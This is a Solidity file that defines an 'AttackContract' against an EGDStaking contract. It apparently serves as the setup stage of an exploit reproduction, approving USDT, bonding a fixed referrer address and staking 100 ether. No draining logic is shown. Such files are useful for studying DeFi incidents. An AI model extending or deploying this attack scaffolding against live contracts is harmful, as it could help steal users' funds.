// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {EGDStaking} from "./EGDStaking.sol";

contract AttackContract {
    EGDStaking egdstaking;
    IERC20 usdt;

    function setUp(address usdtAddr, address egdstakingAddr) public {
        egdstaking = EGDStaking(egdstakingAddr);
        usdt = IERC20(usdtAddr);
        usdt.approve(egdstakingAddr, 100 ether);
        egdstaking.bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
        egdstaking.stake(100 ether);
    }
}
